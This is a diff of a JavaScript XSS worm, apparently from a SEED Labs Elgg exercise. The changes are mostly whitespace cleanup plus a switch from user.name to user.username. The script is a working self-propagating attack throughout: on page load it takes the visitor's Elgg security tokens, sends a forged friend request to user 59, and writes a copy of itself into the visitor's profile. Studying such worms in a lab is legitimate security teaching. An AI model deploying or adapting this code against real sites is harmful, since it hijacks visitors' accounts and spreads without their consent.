@@ -1,13 +1,13 @@
 <script id="worm" type="text/javascript">
-    window.onload = function () {   
+    window.onload = function () {
         // First part: Send Samy a friend request from the visitor's account
         var ts = elgg.security.token.__elgg_ts; // Time Stamp
-        var token= elgg.security.token.__elgg_token; // Security Token
-        var userName = elgg.session.user.name;
+        var token = elgg.security.token.__elgg_token; // Security Token
+        var userName = elgg.session.user.username;
         var guid = elgg.session.user.guid;
         var SamyID = 59;
         if (guid == SamyID) return; // no attack if Samy is the visitor
-        var sendurl = `/action/friends/add?friend=${SamyID}&__elgg_ts=${ts}&__elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;        
+        var sendurl = `/action/friends/add?friend=${SamyID}&__elgg_ts=${ts}&__elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;
         //Create and send Ajax request to add friend
         var Ajax1 = new XMLHttpRequest();
         Ajax1.open("GET", sendurl, true); // last boolean value is for asynchronous request making
@@ -16,10 +16,10 @@
         Ajax1.send();
 
         // Second part: Modify the visitor's profile
-	    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
-	    var jsCode = document.getElementById("worm").innerHTML;
-	    var tailTag = "</" + "script>";
-	    var wormCode = headerTag + jsCode + tailTag;
+        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        var jsCode = document.getElementById("worm").innerHTML;
+        var tailTag = "</" + "script>";
+        var wormCode = headerTag + jsCode + tailTag;
         var sendurl = "/action/profile/edit";
 
         var formData = new FormData();
@@ -64,5 +64,5 @@
         Ajax3.open("POST", sendurl, true);
         Ajax3.setRequestHeader("Host", "www.seed-server.com");
         Ajax3.send(formData);
-	}
+    }
 </script>
